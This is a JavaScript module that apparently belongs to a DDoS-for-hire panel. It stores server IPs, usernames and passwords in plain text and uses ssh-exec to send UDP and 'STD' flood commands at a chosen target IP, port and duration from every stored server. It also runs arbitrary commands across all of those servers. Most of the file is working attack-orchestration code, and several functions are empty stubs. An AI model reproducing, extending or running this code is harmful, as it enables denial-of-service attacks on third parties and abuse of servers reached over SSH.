// Modules
const fs = require("fs");
const SSH = require("ssh-exec");

// Files
const dis = require("./main.js");

// Extra

exports.GetRoot = function(method) {
    // Getting root to hit with depends if the root has the method!
    let rootDB = fs.readFileSync("./assets/db/roots.db", "utf8");
    let roots = rootDB.split('\n');

    let foundcheck = false, foundroot = "";

    roots.forEach(e => {
        if(e.length > 5) {
            if(e.includes(method)) {
                let fix = e.split("('").join("").split("')").join("");
                foundcheck = true;
                if(foundroot == true) {
                    foundroot += "\n" + fix.split("','").join(",");
                } else {
                    foundroot = fix.split("','").join(",");
                }
                console.log(foundroot);
            }
        }
    })

    return (foundcheck ? foundroot:"[x] No root found with this method!");
}

exports.addROOT = function(serverip, serveruser, serverpw, methods) {
    fs.appendFileSync("./assets/db/roots.db", "('" + serverip + "','"+ serveruser + "','" + serverpw + "','" + methods + "')\n");
    return "Root Added!\r\n";
}

exports.removeRoot = function(serverip) {

}

exports.updateRoot = function(serverip) {
    
}

exports.MethodValidation = function(method) {
    let rootDB = fs.readFileSync("./assets/db/roots.db", "utf8");
    if(rootDB.includes(method + ",") || rootDB.includes("," + method)) {
        return true;
    } else {
        return false;
    }
}

exports.GetCommand = function(ip, port, time, method) {
    switch(method) { 
        case "UDP":
            return "python ./g.py " + ip + " " + port + " " + time + ";wall skid";
        case "STD":
            return "./STD " + ip + " " + port + " " + time + ";wall skid";
    }
}

exports.SendSSHCmd = function(ip, port, time, method) {
    let roots = (fs.readFileSync("./assets/db/roots.db", "utf8")).split("\n");
    cmmd = dis.GetCommand(ip, port, time, method);
    roots.forEach(e => {
        if(e.length > 5) {
            info = (((e.split("('").join("")).split("')").join("")).split("','").join(",")).split(",")
            console.log(info)
            SSH(cmmd, {
                user: info[1],
                host: info[0],
                key: "",
                password: info[2]
            }).pipe(process.stdout)
        }
    })
}

exports.rootCOUNT = function() {
    return fs.readFileSync("./assets/db/roots.db", "utf8").split("\n").length;
}

exports.Setup_VPS = function(ip) {

}

exports.SendCommand = function(cmmd) {
    let roots = (fs.readFileSync("./assets/db/roots.db", "utf8")).split("\n");
    roots.forEach(e => {
        if(e.length > 5) {
            info = (((e.split("('").join("")).split("')").join("")).split("','").join(",")).split(",")
            console.log(info)
            SSH(cmmd, {
                user: info[1],
                host: info[0],
                key: "",
                password: info[2]
            }).pipe(process.stdout)
        }
    })
}